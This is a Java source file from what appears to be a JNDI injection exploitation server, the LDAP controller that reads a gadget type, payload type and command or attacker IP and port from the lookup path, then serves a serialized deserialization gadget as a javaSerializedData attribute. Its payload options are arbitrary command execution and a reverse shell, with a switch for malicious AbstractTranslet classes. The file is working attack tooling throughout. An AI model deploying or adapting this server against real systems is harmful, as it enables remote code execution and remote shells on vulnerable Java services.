package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.ObjectPayload;
import com.nu1r.jndi.gadgets.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import static com.nu1r.jndi.gadgets.utils.Utils.getByte;
import static com.nu1r.jndi.gadgets.Config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
import static com.nu1r.jndi.gadgets.Config.Config.URL_PATTERN;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private GadgetType  gadgetType;
    private PayloadType payloadType;
    private String[]    params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
        Entry                                e            = new Entry(base);
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
        ObjectPayload                        payload      = payloadClass.newInstance();
        Object                               object       = payload.getObject(payloadType, params);
        byte[]                               bytes        = (byte[]) getByte(object);

        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", bytes);
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                gadgetType = GadgetType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA GaddgetType >> |@" + gadgetType));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            int thirdIndex = base.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                //System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            switch (payloadType) {
                case nu1r:
                    String cmd = Util.getCmdFromBase(base);
                    int result1 = cmd.indexOf("-");
                    if (result1 != -1) {
                        String[] U = cmd.split("-");
                        int      i = U.length;
                        if (i >= 1) {
                            URL_PATTERN = U[0];
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + U[0]));
                        }
                        if (cmd.contains("AbstractTranslet")) {
                            IS_INHERIT_ABSTRACT_TRANSLET = true;
                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 恶意类继承 AbstractTranslet |@"));
                        }
                    } else {
                        params = new String[]{cmd};
                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    }
                    break;
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println("[+] IP >> " + results[0]);
                    System.out.println("[+] Port >> " + results[1]);
                    params = results;
                    break;
            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
